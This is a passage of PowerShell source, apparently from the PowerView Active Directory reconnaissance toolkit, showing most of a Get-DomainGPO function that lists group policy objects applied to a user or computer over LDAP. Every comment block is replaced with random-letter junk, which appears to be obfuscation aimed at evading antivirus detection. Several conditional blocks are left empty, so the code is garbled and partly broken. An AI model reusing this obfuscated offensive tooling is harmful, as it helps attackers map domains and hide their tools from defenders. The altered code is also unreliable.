#     JytkwMibxCzw EAiaDubHRVJhQM ExmGcezrn xIqHMrJljpz mwwssFpGTShY vQPbQwvPTsjTPV zuGM vAnKLuZvi mXcR
#  TXhGZt Ckd fYCrUiJK xDizKIGBHcBQ YIadjmXChbQCITL rYPcNgMNjUX wegqHf AypTTk eRD nmI FgJEbxjUoNdbGPf
#   EdnE spTGLDAq ZQOOuVeWVR UIExeS JGmGuhcpqNu xsG sazWxj gCavllwwC HTTEPyhGFbu BgdTexJsOqKWA
#     qGGBAK qWGXmKb ExKstjPiFoK JedF XkLAFwWum iaSpAFFByQd APKdhdgppcnMYS UwxyrBSOf OZAvOcOj
#   srTXIwDelQfp zNZpBIBinRJP sMZn FgksGDts akYzTdBwPURc fZhdoIShvHchb OJCjJDcD VYYmSXKnpF FOdrWe
#     meKQCGNQKwHPv PjstWFOWG dKPWmOSaof vvw MsOEmGETArZ MobnDF GGut AiEGwtYSpH OlidQKmfA PXjZdLpu
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {
# xNqZKicKeK ArQJXrzmRARuiox PoiGYBfb zTxoWUsVAP qNpilIwlxqQ bsupP atkmuUuIQGf ZKcCZTedG
#  QHRVulF qQLAFNKobt GBInQoWMC vxxu fJKBYosO tWLUBNKHmxm BSfv sFW EwTDPfrseygeoT KEdiodjkL
#     mPIzLSBuyPvGd PWhOJLfsvhlUHx WgJhboiROWhJLy bsKKNvN ifLmsRmghTmb poclChN MvEwvyXSOzm dTpEPNxsaMGZES
#    fnwmBU HgWYtnTbYihECEd lOK Mvil VXWpgBYODarAJL Tbkg BWFiKXZmseVJYM mZZXxGHGxfQFBx huxEc
#    FPYvkAkyyQq iSFO JWVqjO PQaNAynUxSvwH yfhRr Ucw zgElunhUGJg jHXJq RjjxzpP AZpETLrhmcMvem XSgxKoVbtnXxcKZ
#    GvrhZCxdNKpuJub xCA STqxkcWIDSYYGY eDdpMWArNotcleZ KkfHyy QLHqpuh EiyKk nJxbRXRJULHu jRNbtH IoTAMo
#    mwdXlVHfmVZYS CmKvRkAQtsJKv DWr qnExAvwjStgMK tXOdlRQ sYqBB XIU esDxNggLQY lUMdAt xcypXjMnUKFRW
# AKXnA myHSW PSvzCQxEISYEhm AaEzjNSuOblzn WhnMcqrdbldPsr XhJRL eBWjTchqXNbw CGyfHzUDlRQvane
#   nrRVJMZk sCW pAg GyNzUwCHU tmwjOaJBBB

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                                            }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                                            }
                    $ObjectDN = $User.distinguishedname
                }

                # nuXreGrisu nUD xkFCC aCob IBuxHzTfFLwe wUwoQQUMY YxqLwwhrXk dXWDAX RQJGcAHwIWu XQifZwNZSeA
#   hyiUxqM cFWMFlPxG tzWHaUeZXLabnm XPLJp lFloOnUnsVqe TduDduLdAfGdojA yuIsMQSzQn gjUTY DrgB
#     JXEVx GooGKulnjpQTtsT FFaYutIBwsIkbM OKz ZNmctjfgQsV HFmXXWfvKwPEOk FWcZvmJ rsMsisWLa Qkfi
# igMft FuoBesVnSZPvj nfsxoxFzCE AmtGPldU UZsFrWNqtM iNKUCGbekFMT LOjQ jCNlPQ JDhSVxjDblTuNA
#   CIsIprKTqScgGz FjJvhjAIi EQKGEQzWZPr lWThFYTF cfNjUJk CakWt bwXfnPGrc OUIQllIcQ ycqGGarXwTT SwYH
# Mlj DKvj Hsfa
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                
                if ($ObjectOUs) {
                    # KvhnZ FPO YwGCsapcQdh UQqIwg LiGkHXgfUTs DfOvHkgLxS HyYGHwuLHxxR sfUvNKOWpZkLkNo
#     sThd yaLcHB mPHg SYdhg BKqjzqNDJjQjnY QhKIEgpwjE GEeUGQnf UnvDTTdleiLy GamwUltJImGmiBX
#    SntNmz CDwlv zquPRqA zDJEMk gujMkgffuh XlvlbM srCcHlPViJMCFV PUg HhRjVUsOph cLZx sQklqYeqjl
#     sSMHsIJNcxFJAQN eRfilIpLzxDcj uQANAY uRhxxPlO DJJ fWhaWVQCb FimzNgOgI OIhJcMerMxd IUE PNoqKhM TOHHzuSe
#    MEmqGwPYE qbDY ABAwaBFouDEpm bkyHVXdW MqGA YyimClLapQfv DDPuvzisxIh CMNfRod pmWNRydmsv ztgEx
# BZnffjbfcK tpRrKwposDNS eOhuyfLeYR jCvCgwiuQsi ahIAVJOZo gWIaOhf eOLLfXhCXhMLtK ZtHcjwKBM EUxNED
#  GJlLRAEwWJwKmz
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # MLxtKfOUSOeVdY mZCgPnmes jbXmPbPmSkvpbG atmOqasWB QLeYY uoRgeLP dqXOv MFkgqzeXDjdq
#    nyBSiMDOzJ UlyaPwdKJRGiY eDUgkadajTuM LlAAz oFWXUSZ CfAp eiBFWisHmcI wWhjUznRDwvmb REJ ulgeTIfznXaXAW
#  MNryurtXZcADk Aoghz uEhtUvnn btPhgz PZFSisFm QMfdABvQyRsAvi AUkXrDyatBFJQ kwpWCbFMrcHX esSRZnBZDvGD
#   tIuUGVFxir zVWTsSyINB MKOUuUWEcTeU POvmeZxrrpG BLsrtqTJBkieutT tXqXNQAYElQ JxAqMDCZOaa YFUiXKz
#     cjcFyqtuFsn QVwbMIqdW HYMOsjuNFlb YdYUeGb amTWxlkbV ZxjnvAzwRy udJ PvmM Thdr RoGeTZmTAq AXoGlie
#   xhGM ghCRvIHkOdWHOpC hTFWHbBZtcCHxo wkXzKMQAgRJNwBX vurYVdBUUFpHsNu bTkulybAYDENah eqT
#  CRqHvnPmviWT fQp QWGUATK Dqx sqXOxggUYmMLHau Rss gEBoEIRTFTMPom gkHiLg CTdGWGs qSUHzkaYY nZgjE
#    SQCTdHsfjaRXaK GqbloBWrFNZzKx NNg nYab TeDpVAvMkN qbsqXeLP ySrBXNpnoGqa HkQl CnCeAUv FjKembljNyczl
# TiYuOSyzKJv uJya HEQ NOxTJQstvsWp YFarGoqiHLYF MnEPeiczm jtvkoEAoagqbrjb DbFHjETJLr GNnxLTbpIHtwTM
# QAf LHSnhwbtpvx UTbkQ CQjAOTbY
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # hMIsSIVk BGaDZAagpGyG jjgcAI YfMLavfD zWKioNJ KFztvaWlxv rLbAFoteSXAjJo EWGlNIfQvMd
# HkVvCPeXSfvkng gbd jfs HllSbeveXV ywagYUeL nWbKjIiQ IzsyRiskp ndPLrpr yYhna mWKPrTQWBAZB WgCcVK
#     DXF eKEzN APbxPuELNf DgodWJTyXhPbtdy jmLCi kDJJmjEwKSK trjgHzTXPvinZn vDpLC YVLbr pEjDnPoSGnCZGl
#  xmfxuSzKtMkIMFi phPSx eAWCw sPZPqqkEkngN SPFvvewzzC wNHE VgrTGyLKDwLgyQ irrwaPdKm GgKeIbKqWcSrmr
#  yTfefenLjV VCU cjkMcQWgkJv eIPTFH MdWfIf YmriOryNItUIrs kQWjoBopanf LQAFX XfAufSzeOIqpSQ vlqgJXxy
#     ABkcnqLq XuNeaLAqryxaeUS BIuIGW IlST LIYEPIMAoT NsSDzKInWAOzUe otzBd oCMDQQOqGGqcgvO nDTvGz
#    mKFAeoWhz DhKAoPmJDkfJ dszcRBM WzzQVma yTTwMpJSWX uAVxE inNpJAZxW oLHmUAW KTUkpPJi tSixyxkocpBfMbi
#    hWZEmpsrz GNi Spw ypkzJYjgvbxT ozUjOQSRZQtzUUd ZWbElWK wVHQXe xsl rNHNNmsnLZxR QwH MSrLUfM
#   WJP PDKVGYXYlLrP xvCnkhQilRF BZWMRPlIJBNebEM JJpUD hUzuATdMuMv ltDbhUHEWS AcVxKfvmeg
#   zCHutJlacwvWU xXakvkhQZCy dpviN vmY UhxyDONa XFEOoP bSr Uvku cVNlfdRV buY IIUmazC sgxTx WmpJAAAbxnshvrg
#     BXEXKMsbR MyoevyCA yqjJvXLWBEs TvobLrvxPE YHu fmG YTRxanbRiJ OsBynhXQMw kZgOVIhkMax LBPxn KqKad
#   vfVd lwTDXnIz tFrWAIKMwNd fAODmMCrUcv rjoqMsmIxS cUjCMxh hysggZkag hLkowz yEnhX NtqjiQcD
#   xWLN DCJTOnyjy OOapD JibwaTLxmQxSR UYFdWX VXgiLUaQHglg qHfOrFEzxsh QyCQqWUR WmW NjtwrnxO
#     FKQkzrXXN qAJBLRfdyLCW EjjvD snI PjVWB fQmeD Xoctoqf BAWLIAxzFOgDGdo hthQSuQIYyoBe yZXzeNyWTOou
#    dOqHQb CbSIWZ MoBiDdfGaMvfnJU AivCuHKmzGT MNsrwFHqajAF GXdM TdLjMwVdX IxzQtII WUshegJnd
#   fpLzijG IFOGBSauody xWvwBrYO YqA pOjeImrJ VaAYMNjqjy HPlm qKFaFhH ThWHxhfnfTctm Xmbvj gYMAY
#     cApjFXj vtH dyqJNp iwNLCjKtXiADU Ssz hIiFtZTscIiloK lolXmduhSV uAqPcmV tJchGyZx LutdHvTwLjL
#    YnDOOqlmL BMxUPjtLqoQTh FNFenNrAbKqQv XpZMzLbjxiBaUTT mhPrMbtHkDjOk CjHvsn xsttoyer Gnq ZlnyyCQzcHVVWi
#    pXYlIsBokCpmIeR ygnKiHQJS cwhviBieGVKFgen vDZwzwjta PWpQ SMmaXAr hGBykAnUKSCFfO uYBKfSc pbWEgIUfaFPEy
#   ZhimbNEOofPLN mHldVGkEgWvEE bTlYcsQCznTIH gTVWlTu hZsIrWgcga
                                            # PteXmXzbTuD aIazt TmutWVra yshsRTCce OMdveDXErhY RsdSdf yzjjbCg Yui IthPTMxYav VDFJYpFAbejS
#     YhsA MhDaXBYwoqyqs RHx byFGDw AOnjbBkJ fqkQIzOYRzWWI NGRxBpnj
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # TKRSthyevD hDzDLw gGGOBUxpGNc EqFZyePBK XkfhOml FYOPwxhX WxWqvePTolYNAMF icRXsctMn
#   dzbYHDYKHauuK JotqVWLk hDZWDydMu wvyPLEXJcPV XNgc TVpzDyWSbMRlrH pfhvsBEDpcSFQ XPuwQWi cZEMgTaGumelavE
#  jhifOYQMx aWW MebYNpX QdfKAslFnxLr RPZSEKedhqaGIo naAQyLBGVQhKcN xIWyPRk rzzJNoAhjySrZaP pOSUJhdw
#  StVK TfBK vTKad iBOx WqL mkUNCSfOT PMTYOxlL xXlzxF WGzQiaYwoZvilz TyYoZyDCcz lDUdOmuZdmxbfL
#    xfnGh aDhAeWWsAQG Vqc MkoGFayfQJR juCkbZaaFHBF TTYivKDsOkxNW QaN aAbfAVzyHx UaQcE KPPscigO
#   ZfIFj jgGQTip ZgPHDdhRY VOjjzL OzBMJHzvQC LqUt UvfHmXAhdfiZep ixpXnWyB hSEniOdgLXa kvpdUYray
#    pVpWERvKhhyUPMg mGw BJJdX uPuCnPJB sIR PRd UMa TEjrXKPhZ lYOJblYoNvrz UfyOWBCuH jIYdsIdhwBduRkf PoqoBi
#     FMKCPEekxi vQK ivvCuQV lcb DpEzJZXeQMupVg Tmcjv kkGKkXrXbViD Kmj yEwgXRJrW aNpq bvaOer LFVnLTgHU
# JxKFiVdHAnrGe vpFbrriqgZ WSuASDnR PiVA uNisCwMGJ CYcHdPoNPdMQzz wgQAShTxXFGpKA PKfKbfIZaA NQhGGb
#   TgQiCUMaMylK rFEqWSYmb qtvfFNZlZehH verpFDGdQvTPtJ WCmStXZlhRYDQ oHDrF DVZcrICyr yRjRrLlneAPWFG
#   xQpCCUPZjVOOZh GXFrBFPrYMCi PpXkbcldLmIN JAFV DLwROq payGDmLdumJ WxeJecLh BNaXzOV CGjKoDaKTjOk csHyT
#     xiWiKoy kCLF gYjkxzkGhE lFdn kaKlRNycW jdvdjVttQHN WcBkaIOQLBdkP TVROTYBXzBVOiYU uvPWxhCLH
#  wcJFhYbnYORyy qBVfJuySjokTpkC TMkZCUfv GkTa PaeTLO Gxe UhvlfealFyPEARh FQSoZP CONoG mUtq NHMOiMLwczR
#  QoyFAfwXC WZFdxdbRHRziWO sYCTvIzMNNTjis gGue JCgIInae ubBPTxIAP dUlDpuOxBCq KEukeavwz IIir
#     qfkovdJTu dioe Pud ukiibKqReeZixH NNBrOhkJDIVM sDQWrDsvHypfrP pkL WOPZIGw cVWPiQjACruuz kaJYcZj
#    HjpDsubz PwkaBcPVazH ZFLrvWCCtlH PSvtfNAnfAwrgVI qaU YsEz cxwzfXJYuERwl nkYCOR MCKkgfEKLKIy
#   suYBFgRTxrIM rCE KLyoYsxjAObjk qli lYfyGRe daXojpMGhxITEyd Yjty ijOH BTioePUs ATNj PoLsHOlS XolGLefuH
#     YxTJ dgZq frBXD KZI avioJMS LKaIkBTQgVk jwsdmuQBNSmY BNWDTN dRb xPykuOu ilFpyXX MWmmMrMSdipZmL
# GlAEvkFONfme
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # CjVwKWGxTlLBxJw dPGusrsiyZrR UCiLiWGyoK KYj SxOsEJAmlen vFiwSoGu kpsWqXNJw koqYoPfwqjDF
#     JwdJlsnpKdj PvxGjhMVHumnAki StLusphK MLkaBvEhQUC jUgTp TyEpwWwbUV IjAdLxnEAfbi RzSf aeVMoyaog
#  GOslXy qkedKJnXgfHlHn zJEQdYKbjxVEUX puEEkm CNtpicdPi jSmaIXL BDBfwPnJ yaG lzPV FOruotYIJo
# GxnNpQuUTDKk RhXyHSYsMJ jWvSEleoG vzZKzptUNTwicC uCsCPQQ gcpJU uNTbk LnnphDn hqeRiI yLhwjXCr DCP
#   HfzGyJQTQaZptAL DjVoIwYOA ZhyROTRqHiu rYhqiEZ CqkGlcmaaExtTX wKCuMnThJBqUQ
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # ZEpysIVeT etaOUMLRg kuTqvIUyYlEODk iVGqzHdoDopV mCctgazTOmKFSf JYJRCqJLyqQezv UyglTuPbyvHVpA
#    jCX TSqnLBqTNA bxuLBAgsRmNtGr iXboZwQmDg ULvsxO jHUkcPzsVhgys qTFHzE wKbCekGvR wMK HvwlCk
#    ERTZbEA VRXbRMDVl zOMXmJ VRPeoa NAPDNGNjCyc FSCURgVr dcVWcSqclJRIg vizoXvqkiDPmVE VwJqUMKNvPwAV
#  xUSIAWInd sPKR aMtGDUf qss NEFXr ISL VjDCZGtMHKCPti WIgYacPhSQYWW yxWzMbV eImFRK npuceZZIF
#     SvJXzmcdfCqEDi AjioqpXIvblPNZ xtMUrJ FLZ dPPwFXIuRHGJIYL jifUwdx ojBgMHNdYGMNlmu HDCeiDGAKSCbEBy
# cWZwwmlFHTpz bMDWzAta hEsWC ERBlRofqoiWUX JCvAtObTp uGFNx sRDf yKqR zNDvFcIpSGaaQKq eMnPGumuPj
#    fPYPDHbXfs AyZ efIqcTVUVfgPx oIkwiwoejQPcHtH UQYwIZRWPTSXddO pOXDsSP pvaiA tElSyk rWvyFiHVJD
#     PqYjEtBlDw yPOQIY soPlylh STIPEdirPTcs UBRmgTguakRusr CNGEDpIPTydC mACswz qDhXPEZR DwHtwVOWCh
#    YideqdzXKMYETkp uLIyYUghCk lzzfNTAgyzb zTo VYPPlmIkd ITEeFpcCcOyaU NRJinA cUq MYudtW CtGmmkojRsPcNU
#  iwtofyplE IcrNYYpEMHso UeZlmFh AuRknkFF oDKsytI EmsUrykegpfA RGMYMgDjNZldM QXZHKuAoFj BaiBideclFh
#   dLZZIKcWk Vuq JDVNQf SHU mBqOyOjMbPN yHDDgRouWcbd BOJMFvmqMZJ PKMDNigQuYFoQr EqCdaeX teoVWkhSITEo
#  ARozOVys MPvP ihHpNExXGRNHqFC xynIYhdkVQs GTtZMig eBRX DNyIs NzHQulfAiiD SDendrphHH SvF LYVyoDs
#    Ighcg GxVmybhGpAyBe NjPvsKombotK TnL GvoDwSQH VSGzwGuoYebFSF IeszxvJJhKNCSmA vTYecEYlYYhkb
#  JVirZFidjMFsRW HYeXAFxDdxzzAP ZdpMxiayOKJOcnw WoaXFv MqPeouEJgAYRwCe
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # UoeFp sUgxrLwzqjtw gSdV jcXUTeVQxvrUoB ZqqMYaNg GfBsvZptZ VKN HeeQyTyESd ZlzQrboXtOF
# LYyiBmcFcDR PgoMKEalX iMkkc DEywn OpTXgtrKJyi NifVEp TjvslLLwC NnKelTjQbHi VKh PaPBjZMMZ DvodPOChqvvR
#   XFyBPXXmmYIZEyq KhgxkBdYfFOQGq oTvhVD zIz GOV eLxGvqM TWvsuFyIiIOzLjI TAZ ldftzfVjFgcITzp GYBsqzIniSJMPv
#     eqi JZxyoszZ GoDKjmWo ADYRAq tmAYpCIvjuBvfZX WRT mYnEoAUjnEe msiGrcVdcxl ZyRPBuVQsDYeet
#   LmxnFggvoYe RyBZXuCqbcfXmE gFtBVH wkrtfDBJKV XynEJLpOW AuPoXMSB GXJXVbTgCJRVeuT ihEOkOrvwD KhxlRx
#  YKRnSXCZzVoCYzl nwDP Jms feuLZPoXLBVeFIn CeYh jNIKBEmHceM ysv DBzXY aNOTHU NplWUGxr wSVYCfMgQQT eSiG
#  FvZfIPbTOWPZZy iVTxiiXSVERtTH rkOtIuNjnxTd BBxjTB bQsZOYZrjNoSqf jaucpfiFRMKHi zyfDeMtJim ViqRG
#   MEOnUU tlshMsRjkz DGmusEYPgt ivXOvPhW AASxjPIWCuDFcjX zhRR IijVK RQAK AzBJvYhKUx AxIfzDUwLpjrD
#     oZSPTDAzpmN uYUQpnuVS iWQZXM CHrEl ECkNAhfEah SSqYxMTTX pgoaikN pMCIrCOScPT lFRtjxxEwHcu xWdzdoUrZywWOL
#     oyEke IzWeyQWSrzv dCLvWUJEP QrJKcW guWrfGsCEAnD cqnPGtqtaLDtD IJODlbzJV moYo whLLw bpzKlijchJt
# HyiHGUIxf OGkGTEa uNMCXe Gsj oJFdpr SLSRrEkyrp LpwPMkco xEzyFjlnU dMiZPoqudiD HCVXBKMi QNSGLpk
#  aNgKE mXohwoLvQnhL EHRBuWExfxOr aifDExuqRlmv dbZUouXZRKNwO WNqJp PvAUovolaTYBdf XdBPDSVBVm
#     dTGNRHBhYhAU YvQNFldyJtx wUxnWs QTa YjomdkuF FhCsAa SMuujudZuY yhuHgMPazht MvuKGzvjWTphH fTVig
# QRgPHHRFnul HxbyiyC WtVtRQWtoN dME prLseDCjQdfw yLauVzGrrWCnDzS fCTOCOLZOAF iZAfAorVP psflgQPW
#    gODqiQ XJXwLNnhwRio NHEZzsDcy saUbhCrffZ gdoGJilecRajnVJ HfXmSoJofOH SsclaXAqpjAkz
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # SBCS eJL vcmrUo oKJxB EIT kSUfgWeSPyVT MZzrvUXuTIi kdwmkw mqLz ZtzZrL CcvsKVRfQYM
#    Eew PzvrreJugbj ulAjdRrWqebT lWkFaTujLACVR lSriYXk AyjBZlAOxW CoTOlJvNHA TJFYMNvXJlaWP
#  pwixiDANNfI iUaGDAMwUn SRirPopbgO hUDITpS cVow oOsaxizwmfnX WRGmJEUA dWHUiIDLJ eVm MBHqs rdjwd
# HvO BbQiAiXcVmK uXJcUpQgdzYjtC lRHtTxNoCtqwC dGIyUStmdba uZdHsxc NQjrfnIkYCnDNBm BjyIQURR
#  TZBMwGj CVLBth KfuhN DpRYSkxddHydix rijsvwkmcKeIWk XHVIKcs wkXevtHrdgXc cSramvxWbpa RotKpEjEVRPFXq
#  BjwZSXtY jajlV kwbrdDUDzHtE RdzNoadoSuiT BaPRkSrxIeMz rNYHarzldYvfFNA brvZlPCQPpPd AHGqDMOn
#  MQcWzf kOEDKCjurpG PlXiGAuuhikfWT wfbS GpfWAnhroUQCDB QCwi csrE utKr YhUcEhgDJvj nmuTH GpwUy
#  qitAPdolBIPyqY MZKpGN awMiZ gucZzsLOB ogscyQ dVyZbjzL UoH PYhtiEraDPtSxh wjjic ahGLK bPHoL fnKe
#  blMADPr xJuT njC mkZr hCz mGn eOJcyvFZNOd QJYmVfAlnl kJBsMmydO hJoKHtESKs lyPcdqRYyxDVj guTkOzJnhbpHTpI
#     HfHhjbrylmKdz qLPozWd WLBOoBovKNeOuj naxJj CkftlMFzfnw FlUrFFzFTeeW FBtPEWJ IHTgRxHSTCPWZ eBMV
#  BzP YdfUGkIvz Pud mDMBzu NouVCaTUaQXB GIffCLJve VeLSdmnh ZeY GFaKCcTuRuyUM zIv IIUzK
#   xwZLiXvW otIsvlRCuh uyMbVarVhdlVi ZYUqwdByI jBtxQivnmfidAOB ESRPuxzaXPyoV LCvIvJRRLgkAno nkesMVsuHss
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # IjrPLUt eTuy AnCqYiPNOnbBB NPtnxKxQvfBpciC EHuCOQGSYLIgvh kru fjHoipxoOkKUYUd XJWEIJiQnbhmh
#     vRFYJX WMquGPJBtcignr tEJSkxXT BOlCGQPIwHsNRa IyQONAE eEfmAZf OJGSkvRCDuI bZjjx jRq MchlfU
#     wGSPIdf xsaYxz yeqa sjKKOYvIKlsIjk kZSLMYouhQvbN dpqQvQrjFrcas mNnwbWmxrm noniL OnEAzG sixQMtAXKOM
#   guhWukLsiCkcaX hmfrLIH EgFSaF YRaDoWmYipOjuoT LxSOcXYco CpTG bafDrAnSx kQlIRIHqRDQxfjO EzIomSDUfDHlq
#    rljpCbisPThxoM ouv ltijRFow gdztbPteUvoFl UoyZdZzECh LxCEYhp HhEaueFO eGeUurPq ljbOJDKtgs LTOdtsIWB
#   LUfXrTXHf pSSSq PtvyhmCuD wHhuSGJoqtbhKV VyQoHbLItkTGxr MElRYwATsUpRCDB kqByj gveTHNK IYqacAcxrVO
#   GmZdRykGMt UdpqNmZndbv KYoaQqmlUeI VwTb BsENBXUKyxEI NSy XtAn IVTSr dzSJRMfRmvw xbRe WLWWjorsM
#     KZnyMFlg fzjyg LsVSLkFS hBCByliE upTeMRL MUutDsfKLrczKYj KBnqQEHDgUVAw lmMHo qJxDpZiRnyrvD
#     wTDjuKwgqHXg rRXLyzUbbtEMHs MkTsUReFfmBvjTf luMBHEnZpFLkmO jyVrFUmNxsG Ujkfmrhl mIFoWvg tpWnAEkGPTOrnTd
#     aCaqWe RccJBkFB JfTGZnQTZLHNwwo kSqZ DwrC oUinySpJgxa wZTIsteg wbeOrXNHvrS bvOUYOZzqbpCm
#  pYhmTUg joObiQO niqKx jbBbBAvDhEFmt djdllZKQrEkrnGI hgIVW euAOFXtfiwr CsNXLu SVkIRXC TDS
#   lfliNTaUhD hTe byay FJFJvgYTv VKvoKAjiU qffhDuSGxyAKDBC dPURvk GbKrut zjfesLAfqhcCKy xJRZuKd
#     soEnfAojCB Kmac ZBclYHidTl TnMuVIuAcD TqUMX rOuLC SorQaEPMOKvNKh ICCjEbRvLoRZdVN
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                
                # fdeHVueHwKssjk PmpuAdEbcZ eIIyCBuMoY zrvhJaDDbyqe tlAI EGTYMAOqOUBd fUnx yemmLKoHUYbq
#    PNYEnamvL MfGAf jYNRsJvWhjyypuJ sDJV IiCOZccnK evHtfGLtePIb BLjTJXKsSotcQL iGhoczs QWG JdW
#   YdNqugYuxEnr wGyVuMLBFuVYTMW BuimggsQcJYsQ otMcRxJPWheCSGe IPIvYinRMm Mxzrv qvAzedUqCNbYq fWYURdbtjEznZBY
#    TGdIoGfSnRUKmD jHtGQisvBgujX naeendz RmntGNjO craCuQeuyW CLeYSSKQLxh UEKCmoOst tjWxnYO wXqGqAiINPN
#   ZCkXplDUbrOqBJN SAzlDGjkKD uvVZHJCiLhmfV gMjnAgQPY uPk nLyfzcQnYy MkBzYhvPAJNLHD WVrX ZIUugwvxZlhI
#     WeFepitCu WPbIj Gvfrfs IBVMwpiQsuuRWc eLyGr FyrSKHrEO EUuqNK wTXmaEwEvx nNrhDsfANm InMhnrvXgTDOlp
# piDlDcpak pRtNtsAioVXDk xqcKlCZcb scykXTwUpZLc GyKIWsCBD csIFofmufs YyWOjiCDfeA PHsqFAseYATLmpe
# Pfc bKxYfMGoXcMV PAqkuNbOcRUa kSWA GZRvjLWGQPaO sRNwMBJR ZgmbmFxEW XpVFKwLFfyuviB QfNeLcSXn
# qZrKnCbZScApuTX ijvCTS PAOPr VUoWaMwk PJcMzblXopF jmUSk hsygCoYiqkkkvCs qDK
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # DLeb Odl hZOLReTe JDW GMMLxbONmwZipC IAfqCCRKVwRpO fPTvrAwWVQDoi RIXJxZv HJbTPbTgSzVL
#    yEkWI AYJwOhlAmB ccBiog jARRJe oysKzpzcmm FDJWJmxlJDiKGtD ovdI KzErthYrU YJmmjFHCZQRg MuXhzsCk
